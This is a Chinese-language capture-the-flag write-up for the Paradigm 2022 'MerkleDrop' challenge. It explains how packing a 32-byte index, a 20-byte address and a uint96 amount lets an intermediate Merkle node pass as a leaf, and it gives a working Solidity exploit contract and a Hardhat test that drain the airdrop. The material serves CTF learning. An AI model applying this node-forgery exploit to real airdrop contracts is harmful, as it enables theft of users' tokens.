# paradigm 2022 ctf 题解——MerkleDrop

---

    author：Thomas_Xu

**环境配置**:
由于题目环境需要使用docker，环境配置有点繁琐。我重新搭了一个hardhat框架的测试环境,而由于题目出在以太坊的主链上,并使用`Alchemy`fork了一个主网节点进行测试

## 题目分析

首先先来看一下这道题目的描述` Were you whitelisted?`你是否在白名单里？显而易见，这是一道关于空头白名单的问题。而题目给我们提供了64个叶子节点的验证信息，其中包括每个用户地址对应的 `index`，`amount` 以及 `proof` 验证hash。用户可以凭此文件中的相关 Proofs 到合约中 Claim 相应数量的 Token。似乎我们要通过某种漏洞来获取白名单权限，我们进入到`Setup`中去看判断条件：

```solidity
function isSolved() public view returns (bool) {
        bool condition1 = token.balanceOf(address(merkleDistributor)) == 0;
        bool condition2 = false;
        for (uint256 i = 0; i < 64; ++i) {
            if (!merkleDistributor.isClaimed(i)) {
                condition2 = true;
                break;
            }
        }
        return condition1 && condition2;
    }
```

有两个判题：

* 要求领完空投钱包的余额
* 要求白名单里至少有1个人没有领空投

算了一下，json文件中64个地址能领的金额相加刚好等于`merkleDistributor`中的余额 75 ETH，想要同时完成这两个判题貌似是不可能的事。

如果是按照标准实现的Merkle Tree我们几乎不可能对其进行攻击。那么让我们来对比一下这里的代码和标准实现的Merkle Tree有什么不同吧。
![](../images/ParadigmCTF/2022/merkledrop_01.jpg)

这个`uint96`是最可疑的地方

让我们回顾一下MerkleTree的验证过程

![](C:\Users\小栩\Documents\GitHub\Conract_Attack\images\ParadigmCTF\2022\MerkleHash.png)

Merkle Tree 的基本原理是依靠叶子节点的值一层层计算出 hash，最终得到 Root 值，验证某一个叶子节点是否在 Merkle Tree 中，只需提供相对应的 Proofs 路径进行计算，观察最终的 Root 值是否一致即可。



而这个题最巧妙的一点就是：由于`amout`字段使用了uint96，导致出现了一个巧合。

```solidity
function claim(uint256 index, address account, uint96 amount, bytes32[] memory merkleProof) external {
        ...

        // Verify the merkle proof.
        bytes32 node = keccak256(abi.encodePacked(index, account, amount));
        require(MerkleProof.verify(merkleProof, merkleRoot, node), 'MerkleDistributor: Invalid proof.');

      	...
    }
}
```

claim里的node节点hash计算方式是先`abi.encodePacked(index, account, amount)`再hash。而这里的三个字段为

- index[uint256]: 32bytes
- account[address]:20bytes
- amount[uint96]:12bytes

这三个字段加起来刚好是64bytes。正好是两个 keccak256 hash 结果拼接在一起的大小。可以看成是其中一个 hash 值作为 index, 另一个 hash 值作为 account + amount。

那我们就可以利用此巧合去构造一个假的输入，而这个输入可以完美通过hash验证。

## Exploit

现在的重点就是去构造这个”巧合的哈希“

空投的总数量为7500个ETH，即0x0fe1c215e8f838e00000，而uint96的最大值为0xffffffffffffffffffffffff，很明显，如果是随机的哈希结果，是会远远大于空投的总数量。

```
0xffffffffffffffffffffffff
0x00000fe1c215e8f838e00000
```

二者至少差了5个0，不过这也给我们提供了一个思路，我们去tree.json搜一下有5个连续0的哈希。

![](C:\Users\小栩\Documents\GitHub\Conract_Attack\images\ParadigmCTF\2022\marklejson_serch.png)



很容易发现37这个节点

更巧合的是从第一个0处把这个哈希截断的话，前一部分刚好是20bytes,后一部分刚好是12bytes。换句话说，这个哈希可以被解析为`account + amount`。

```
account: 0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A
amount: 0x00000f40f0c122ae08d2207b
```

来看看`MerkleProof`里是怎么验证节点的：

```solidity
function verify(
    bytes32[] memory proof,
    bytes32 root,
    bytes32 leaf
  )
    internal
    pure
    returns (bool)
  {
    bytes32 computedHash = leaf;

    for (uint256 i = 0; i < proof.length; i++) {
      bytes32 proofElement = proof[i];

      if (computedHash < proofElement) {
        // Hash(current computed hash + current element of the proof)
        computedHash = keccak256(abi.encodePacked(computedHash, proofElement));
      } else {
        // Hash(current element of the proof + current computed hash)
        computedHash = keccak256(abi.encodePacked(proofElement, computedHash));
      }
    }

    // Check if the computed hash (root) is equal to the provided root
    return computedHash == root;
  }
}
```

其实验证过程和merkletree的标准实现一样，将叶子节点和验证节点自下而上，两两哈希拼接在一起后再取哈希，最终和root哈希比较是否相等。

那么由于之前的巧合，我们可以通过index为37节点的第一个proof节点为突破口。

> 由于验证过程的第一次验证（被验证节点和第一个proof节点hex）也是需要37号节点的哈希和我们的“突破口”哈希拼接后再取哈希进行后面的操作。
>
> 那么我们就可以在第一次验证的这个点做文章了

我们回过头来看一看`claim`函数里面是怎么计算的节点哈希：

```
bytes32 node = keccak256(abi.encodePacked(index, account, amount));
```

之前讲到，`index`可以看作前哈希，`account`和`amount`可以看作后哈希，那么我们就可以直接构造出第一次验证时的拼接。

也就是说我们可以完美的用“意外”的参数通过验证。

但此时`account`为`0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A`,amount为`0x00000f40f0c122ae08d2207b`这都是意外的参数。而`amount`换算之后刚好小于75

```
计算一下还剩多少token未领
0x0fe1c215e8f838e00000 - 0x00000f40f0c122ae08d2207b = 
0xa0d154c64a300ddf85
```

而这个amout刚好与index为8的节点amout相同，那么只要通过这个叶子节点，就可以领完空投合约里的所有token，解决本题。

附exploit合约

```solidity
contract Exploit {
    constructor(Setup setup) {
        MerkleDistributor merkleDistributor = setup.merkleDistributor();
        
        //通过拼接哈希，跳过第一个验证节点。
        bytes32[] memory merkleProof1 = new bytes32[](5);
        merkleProof1[0] = bytes32(0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d);
        merkleProof1[1] = bytes32(0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde);
        merkleProof1[2] = bytes32(0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813);
        merkleProof1[3] = bytes32(0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c);
        merkleProof1[4] = bytes32(0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5);
        merkleDistributor.claim(
                0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442, 
                address(0x00d48451c19959e2d9bd4e620fbe88aa5f6f7ea72a), 
                0x00000f40f0c122ae08d2207b,
                merkleProof1
        );

        //用index 8取完剩下的token即可
        bytes32[] memory merkleProof2 = new bytes32[](6);
        merkleProof2[0] = bytes32(0xe10102068cab128ad732ed1a8f53922f78f0acdca6aa82a072e02a77d343be00);
        merkleProof2[1] = bytes32(0xd779d1890bba630ee282997e511c09575fae6af79d88ae89a7a850a3eb2876b3);
        merkleProof2[2] = bytes32(0x46b46a28fab615ab202ace89e215576e28ed0ee55f5f6b5e36d7ce9b0d1feda2);
        merkleProof2[3] = bytes32(0xabde46c0e277501c050793f072f0759904f6b2b8e94023efb7fc9112f366374a);
        merkleProof2[4] = bytes32(0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c);
        merkleProof2[5] = bytes32(0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5);
        merkleDistributor.claim(8, address(0x249934e4C5b838F920883a9f3ceC255C0aB3f827), 0xa0d154c64a300ddf85, merkleProof2);

    }
}
```

附hardhat测试用例

```javascript
const { expect } = require("chai");
const { ethers } = require('hardhat');
describe("Challange merkleDrop", function() {
    let attacker,deployer;
    it("should return the solved", async function() {
        [attacker,deployer] = await ethers.getSigners();
        const SetupFactory = await ethers.getContractFactory("MerkleSetup", attacker);
  
        const setup = await SetupFactory.deploy({
            value: ethers.utils.parseEther("75")
        });
        
        //Exploit

        const ExploitFactory = await ethers.getContractFactory("MerkleDropExploit",attacker);
        await ExploitFactory.deploy(setup.address);


        expect(await setup.isSolved()).to.equal(true);
        
    });
  });
  
```

